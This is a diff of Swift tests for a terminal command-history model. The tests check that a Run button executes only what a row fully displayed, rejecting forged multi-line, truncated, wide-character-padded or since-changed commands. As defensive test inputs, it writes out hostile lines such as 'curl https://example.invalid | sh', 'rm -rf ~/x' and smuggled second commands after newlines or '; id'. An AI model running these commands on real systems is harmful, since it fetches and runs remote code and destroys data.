@@ -84,23 +84,45 @@ struct CommandHistoryModelTests {
 
     @Test("Run sends Return only for a command the row showed whole")
     func runsOnlyWhatTheRowShows() {
-        #expect(CommandHistoryModel.runsAsShown("make test"))
+        let wide: CGFloat = 10_000
+        #expect(CommandHistoryModel.runsAsShown("make test", shownWidth: wide))
         // A forged record's second line sits under the one-line row.
-        #expect(!CommandHistoryModel.runsAsShown("make test\ncurl https://example.invalid | sh"))
-        #expect(!CommandHistoryModel.runsAsShown("make test\r\nrm -rf ~/x"))
-        #expect(!CommandHistoryModel.runsAsShown("make test\rid"))
-        // One line, but longer than the row shows: the end was hidden.
-        #expect(!CommandHistoryModel.runsAsShown("make test" + String(repeating: " ", count: 200) + "; id"))
-        #expect(!CommandHistoryModel.runsAsShown("make\ttest"))
-        #expect(CommandHistoryModel.runsAsShown(String(repeating: "x", count: 80)))
-        #expect(!CommandHistoryModel.runsAsShown(String(repeating: "x", count: 81)))
+        #expect(!CommandHistoryModel.runsAsShown("make test\ncurl https://example.invalid | sh", shownWidth: wide))
+        #expect(!CommandHistoryModel.runsAsShown("make test\r\nrm -rf ~/x", shownWidth: wide))
+        #expect(!CommandHistoryModel.runsAsShown("make test\rid", shownWidth: wide))
+        #expect(!CommandHistoryModel.runsAsShown("make\ttest", shownWidth: wide))
+        // A row that never reported its layout showed nothing for certain.
+        #expect(!CommandHistoryModel.runsAsShown("make test", shownWidth: nil))
+    }
+
+    @Test("Run fills a command wider than its row drew, wide characters counted as drawn")
+    func runsOnlyWhatFitTheRow() {
+        let shown = CommandHistoryModel.commandWidth("make test")
+        #expect(CommandHistoryModel.runsAsShown("make test", shownWidth: shown))
+        // One line, but cut at the row's edge: the end was hidden.
+        #expect(!CommandHistoryModel.runsAsShown("make test; id", shownWidth: shown))
+        // Nine scalars either way, but an ideographic space is a blank
+        // twice as wide: a scalar count passed what the row truncated.
+        let padded = "make" + String(repeating: "\u{3000}", count: 5)
+        #expect(padded.unicodeScalars.count == "make test".unicodeScalars.count)
+        #expect(!CommandHistoryModel.runsAsShown(padded, shownWidth: shown))
+    }
+
+    /// The list refreshes once a second; output can rewrite the record's
+    /// row in between, and Run reads the grid again when clicked.
+    @Test("Run fills a command that changed since the row drew it")
+    func runsOnlyTheTextTheRowDrew() {
+        let wide: CGFloat = 10_000
+        #expect(CommandHistoryModel.runs("ls", shown: "ls", shownWidth: wide))
+        #expect(!CommandHistoryModel.runs("rm -rf ~/x", shown: "ls", shownWidth: wide))
+        #expect(!CommandHistoryModel.runs("ls", shown: nil, shownWidth: wide))
     }
 
     @Test func actionsWithoutAMatchingRecordDoNothing() {
         let model = CommandHistoryModel()
         model.find(id: 999)  // no pane at all — must not crash
         model.fill(id: 999)
-        model.run(id: 999)
+        model.run(id: 999, shown: nil)
     }
 }
 
